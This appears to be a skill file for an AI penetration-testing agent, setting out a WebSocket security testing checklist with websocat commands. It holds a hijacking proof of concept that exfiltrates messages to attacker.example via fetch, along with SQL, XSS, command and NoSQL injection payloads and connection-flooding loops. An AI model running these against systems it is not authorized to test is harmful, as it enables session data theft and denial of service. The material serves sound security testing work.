---
name: websocket-testing
description: WebSocket security testing — injection, auth bypass, hijacking
origin: AI Threat Hunting
---

# WebSocket Security Testing

> **Kali MCP audit header:** use `X-Technique: OTHER` for generic WebSocket protocol and CSWSH probing. Switch to the specific vuln class when the WS message carries a `SQLI`, `XSS`, `CMDI`, or `AUTH` payload.

## When to Activate

- Application uses WebSocket connections (`ws://` or `wss://`)
- Real-time features: chat, notifications, live updates, trading
- `Upgrade: websocket` observed in HTTP traffic

## Tools

- Burp Suite (WebSocket history + Repeater)
- Browser DevTools (Network → WS tab)
- websocat (CLI WebSocket client)
- OWASP ZAP (WebSocket support)
- Custom scripts (Python websockets library)

## Methodology

### 1. Discover and Map

- [ ] Identify WebSocket endpoints in JavaScript source: `rg "new WebSocket|\.connect\(.*ws" --type js`
- [ ] Check for `ws://` (unencrypted) vs `wss://` (TLS)
- [ ] Connect and observe handshake:
      ```bash
      websocat -v wss://target.example/ws
      # -v shows headers, handshake, and frames
      ```
- [ ] Map message types by sending and receiving:
      ```bash
      echo '{"type":"ping"}' | websocat wss://target.example/ws
      ```
- [ ] Document message flow: client→server and server→client

### 2. Authentication Testing

- [ ] Connect without token:
      ```bash
      websocat wss://target.example/ws
      # If connection succeeds and receives data → missing auth
      ```
- [ ] Connect with modified/expired token:
      ```bash
      websocat -H "Cookie: session=invalid_token" wss://target.example/ws
      websocat -H "Authorization: Bearer expired_jwt" wss://target.example/ws
      ```
- [ ] Test per-message auth: connect with valid token, then send privileged messages after token expires
- [ ] Replay handshake with another user's cookies

### 3. Authorization Testing

- [ ] Send messages targeting other users' resources:
      ```bash
      echo '{"action":"get_profile","user_id":"OTHER_USER_ID"}' | websocat wss://target.example/ws
      ```
- [ ] Subscribe to unauthorized channels:
      ```bash
      echo '{"subscribe":"admin-events"}' | websocat wss://target.example/ws
      ```
- [ ] Modify user ID or room ID in messages
- [ ] Test IDOR in WebSocket message parameters

### 4. Injection Attacks

- [ ] SQLi in message parameters:
      ```bash
      echo '{"search":"'\'' OR 1=1--"}' | websocat wss://target.example/ws
      ```
- [ ] XSS: `{"message":"<script>alert(document.domain)</script>"}` — check if rendered to other users
- [ ] Command injection: `{"cmd":"test; id"}` in server-processed fields
- [ ] NoSQL: `{"user":{"$ne":null}}` if backend uses MongoDB

### 5. Cross-Site WebSocket Hijacking (CSWSH)

- [ ] Check if Origin header is validated during handshake
- [ ] Create PoC page on attacker domain:
      ```javascript
      var ws = new WebSocket('wss://target.example/ws');
      ws.onmessage = function(e) {
        fetch('https://attacker.example/log?d=' + btoa(e.data));
      };
      ```
- [ ] Test if victim's cookies are sent with cross-origin WS handshake
- [ ] Verify data exfiltration from victim's session

### 6. Message Manipulation

- [ ] Modify message content in transit (Burp intercept)
- [ ] Replay previous messages — check for nonce/sequence validation
- [ ] Send out-of-order messages
- [ ] Send malformed/oversized messages — check error handling
- [ ] Binary message tampering

### 7. Denial of Service

- [ ] Open many concurrent connections:
      ```bash
      for i in $(seq 1 100); do websocat wss://target.example/ws & done
      # Check how many succeed before server rejects
      ```
- [ ] Send rapid messages:
      ```bash
      while true; do echo '{"ping":1}'; done | websocat wss://target.example/ws
      ```
- [ ] Send oversized message: `python3 -c "print('A'*1000000)" | websocat wss://target.example/ws`
- [ ] Keep connections idle — test timeout enforcement

### 8. Data Exposure

- [ ] Monitor all incoming messages for sensitive data:
      ```bash
      websocat -H "Cookie: session=VALID" wss://target.example/ws | tee /engagements/$ENGAGEMENT_KEY/scans/ws_messages.log
      # Review log for PII, tokens, internal IDs, other users' data
      ```
- [ ] Check if server broadcasts data meant for other users (open two connections with different users, compare received messages)
- [ ] Check for verbose error messages: send malformed JSON, observe error detail level

## What to Record

- WebSocket endpoint URL and protocol
- Authentication mechanism (or lack thereof)
- Vulnerability type and proof payload
- Data exposed or action performed
- CSWSH PoC if Origin not validated
- Severity: Critical (data theft, RCE) to Medium (DoS, info leak)

## Extended Resources

- `agent/skills/source-analysis/SKILL.md` — for discovering WebSocket endpoints in JavaScript source
- WebSocket testing methodology is otherwise self-contained
